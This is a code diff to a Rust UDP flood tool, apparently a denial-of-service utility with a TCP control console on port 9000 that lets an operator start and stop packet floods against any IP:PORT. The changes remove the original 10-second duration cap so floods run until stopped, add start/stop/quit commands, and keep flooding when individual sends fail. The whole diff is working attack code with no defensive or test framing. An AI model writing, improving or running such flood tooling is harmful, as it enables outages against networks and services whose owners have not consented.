@@ -7,7 +7,6 @@ use anyhow::Result;
 
 const THREADS: usize = 50;
 const BURST_SIZE: usize = 5;
-const DURATION_SECONDS: u64 = 10;
 const CONTROL_PORT: u16 = 9000;
 
 fn build_payload() -> Vec<u8> {
@@ -35,7 +34,8 @@ async fn handle_flood(target: String, packet_count: Arc<AtomicU64>, running: Arc
 
     while running.load(Ordering::Relaxed) == 1 {
         for _ in 0..BURST_SIZE {
-            socket.send_to(&payload, &target).await?;
+            // We don't want to error out if a single send fails, just continue
+            let _ = socket.send_to(&payload, &target).await;
             packet_count.fetch_add(1, Ordering::Relaxed);
         }
     }
@@ -52,39 +52,51 @@ async fn pps_monitor(packet_count: Arc<AtomicU64>, running: Arc<AtomicU64>) {
     }
 }
 
-// Helper function to safely write to stream with error handling
-// FIXED: Use the correct type from into_split()
 async fn safe_write(writer: &mut tokio::net::tcp::OwnedWriteHalf, message: &[u8]) -> Result<()> {
     match writer.write_all(message).await {
         Ok(_) => Ok(()),
-        Err(e) if e.kind() == std::io::ErrorKind::BrokenPipe => {
-            // Client disconnected, this is not an error we need to propagate
-            Ok(())
-        }
+        Err(e) if e.kind() == std::io::ErrorKind::BrokenPipe => Ok(()),
         Err(e) => Err(e.into()),
     }
 }
 
 async fn handle_client(stream: TcpStream) -> Result<()> {
-    // stream.into_split() returns OwnedReadHalf and OwnedWriteHalf
     let (reader, mut writer) = stream.into_split();
     let reader = BufReader::new(reader);
     let mut lines = reader.lines();
 
-    let _ = safe_write(&mut writer, b"Enter target IP:PORT (or empty to quit)\n").await;
+    // State to hold the running flood tasks and their control flag
+    let mut flood_state: Option<(Vec<tokio::task::JoinHandle<Result<()>>>, tokio::task::JoinHandle<()>, Arc<AtomicU64>)> = None;
+
+    // Welcome message
+    let _ = safe_write(&mut writer, b"--- UDP Flood Control ---\nCommands:\n  start <IP:PORT>\n  stop\n  quit\n-------------------------\n").await;
 
     while let Ok(Some(line)) = lines.next_line().await {
-        if line.trim().is_empty() {
-            // User entered an empty line, so we break the loop and close the connection.
-            break;
+        let parts: Vec<&str> = line.trim().split_whitespace().collect();
+        if parts.is_empty() {
+            continue;
         }
-        
-        if let Some((ip, port_str)) = line.trim().split_once(':') {
-            if let Ok(port) = port_str.parse::<u16>() {
-                let target = format!("{}:{}", ip, port);
-                println!("Received target: {}", target);
+
+        match parts[0] {
+            "start" => {
+                if flood_state.is_some() {
+                    let _ = safe_write(&mut writer, b"Error: A flood is already in progress. Use 'stop' first.\n").await;
+                    continue;
+                }
+
+                if parts.len() != 2 {
+                    let _ = safe_write(&mut writer, b"Error: Invalid format. Use: start IP:PORT\n").await;
+                    continue;
+                }
                 
-                let _ = safe_write(&mut writer, format!("Flooding target: {}\n", target).as_bytes()).await;
+                let target = parts[1].to_string();
+                if target.parse::<std::net::SocketAddr>().is_err() {
+                     let _ = safe_write(&mut writer, b"Error: Invalid target format. Use a valid IP:PORT.\n").await;
+                     continue;
+                }
+
+                println!("Starting flood for target: {}", target);
+                let _ = safe_write(&mut writer, format!("Starting flood for target: {}\n", target).as_bytes()).await;
 
                 let packet_count = Arc::new(AtomicU64::new(0));
                 let running = Arc::new(AtomicU64::new(1));
@@ -103,31 +115,49 @@ async fn handle_client(stream: TcpStream) -> Result<()> {
                     flood_tasks.push(tokio::spawn(handle_flood(tgt, pc, run)));
                 }
 
-                sleep(Duration::from_secs(DURATION_SECONDS)).await;
-                running.store(0, Ordering::Relaxed);
-
-                for task in flood_tasks {
-                    if let Err(e) = task.await {
-                        eprintln!("Flood task error: {}", e);
-                    }
-                }
-                
-                let _ = monitor_handle.await;
-
-                println!("Stopped for target: {}", target);
-                
-                let _ = safe_write(&mut writer, format!("Stopped flood for target: {}\n", target).as_bytes()).await;
-
-            } else {
-                let _ = safe_write(&mut writer, b"Invalid port number.\n").await;
+                flood_state = Some((flood_tasks, monitor_handle, running));
             }
-        } else {
-            let _ = safe_write(&mut writer, b"Invalid format. Use IP:PORT.\n").await;
+            "stop" => {
+                if let Some((flood_tasks, monitor_handle, running)) = flood_state.take() {
+                    println!("Stopping flood...");
+                    let _ = safe_write(&mut writer, b"Stopping flood...\n").await;
+                    
+                    running.store(0, Ordering::Relaxed);
+
+                    for task in flood_tasks {
+                        if let Err(e) = task.await {
+                            eprintln!("Flood task error on shutdown: {}", e);
+                        }
+                    }
+                    
+                    let _ = monitor_handle.await;
+                    
+                    println!("Flood stopped.");
+                    let _ = safe_write(&mut writer, b"Flood stopped.\n").await;
+                } else {
+                    let _ = safe_write(&mut writer, b"Error: No flood is currently running.\n").await;
+                }
+            }
+            "quit" => {
+                break;
+            }
+            _ => {
+                let _ = safe_write(&mut writer, b"Error: Unknown command.\n").await;
+            }
         }
-        
-        let _ = safe_write(&mut writer, b"Enter target IP:PORT (or empty to quit)\n").await;
     }
-    
+
+    // Cleanup: If the client disconnects while a flood is running, stop it.
+    if let Some((flood_tasks, monitor_handle, running)) = flood_state.take() {
+        println!("Client disconnected, stopping active flood...");
+        running.store(0, Ordering::Relaxed);
+        for task in flood_tasks {
+            let _ = task.await; // Wait for tasks to finish
+        }
+        let _ = monitor_handle.await;
+        println!("Flood stopped due to client disconnect.");
+    }
+
     println!("Client disconnected");
     Ok(())
 }
